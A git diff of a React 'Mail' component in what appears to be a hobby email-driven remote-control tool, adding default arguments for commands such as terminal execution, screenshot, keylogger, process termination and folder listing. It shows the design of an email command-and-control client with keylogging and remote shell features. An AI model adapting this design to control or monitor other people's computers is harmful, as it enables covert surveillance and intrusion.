@@ -41,30 +41,35 @@ export default function Mail(props) {
                 setCommand("Shutdown " + time);
                 setMailCommand("Shutdown");
                 setDescription("Shutdown the computer after the given time in seconds");
+                setCmdArg("0");
                 break;
             case 1:
                 setSubject("[RDCVE] Sleep");
                 setCommand("Sleep " + time);
                 setMailCommand("Sleep");
                 setDescription("Put the computer to sleep after the given time in seconds");
+                setCmdArg("0");
                 break;
             case 2:
                 setSubject("[RDCVE] MAC/IP");
                 setCommand("MAC/IP");
                 setMailCommand("MAC/IP");
                 setDescription("Get the MAC and IP address of the computer");
+                setCmdArg("0");
                 break;
             case 3:
                 setSubject("[RDCVE] Task Manager");
                 setCommand("Task Manager " + task_number); // 0 for all, 1 for running, 2 for not responding, 3 for RAM, 4 for CPU
                 setMailCommand("Task Manager");
                 setDescription("Get the list of running processes with ports and PIDs");
+                setCmdArg("0");
                 break;
             case 4:
                 setSubject("[RDCVE] Terminal");
                 setCommand("Terminal ", command);
                 setMailCommand("Terminal");
                 setDescription("Run a command in the terminal");
+                setCmdArg("");
                 break;
             case 5:
                 ;
@@ -72,30 +77,35 @@ export default function Mail(props) {
                 setCommand("Screenshot");
                 setMailCommand("Screenshot");
                 setDescription("Take a screenshot of the computer");
+                setCmdArg("0");
                 break;
             case 6:
                 setSubject("[RDCVE] Keylogger");
                 setCommand("Keylogger");
                 setMailCommand("Keylogger");
                 setDescription("Get the keystrokes of the computer");
+                setCmdArg("0");
                 break;
             case 7:
                 setSubject("[RDCVE] Terminate");
                 setCommand("Terminate " + PID);
                 setMailCommand("Terminate");
                 setDescription("Terminate the a task with the given PID");
+                setCmdArg("0");
                 break;
             case 8:
                 setSubject("[RDCVE] Folder Tree");
                 setCommand("Folder Tree " + folderName);
                 setMailCommand("Folder Tree");
                 setDescription("Get the folder tree of the computer. The computer username is: dodin");
+                setCmdArg("C:/Users/dodin/Desktop");
                 break;
             case 9:
                 setSubject("[RDCVE] System Info");
                 setCommand("System Info");
                 setMailCommand("System Info");
                 setDescription("Get the system info of the computer.");
+                setCmdArg("0");
                 break;
             default:
                 toastError("Error: Invalid command")
@@ -127,7 +137,7 @@ export default function Mail(props) {
         form.sender = mail;
         form.password = password;
         form.subject = subject;
-        form.command = command;
+        form.command = mailCommand;
         form.cmdArg = cmdArg;
         setForm(form);
         axios.post("http://localhost:3001/api/sendMail", form, {
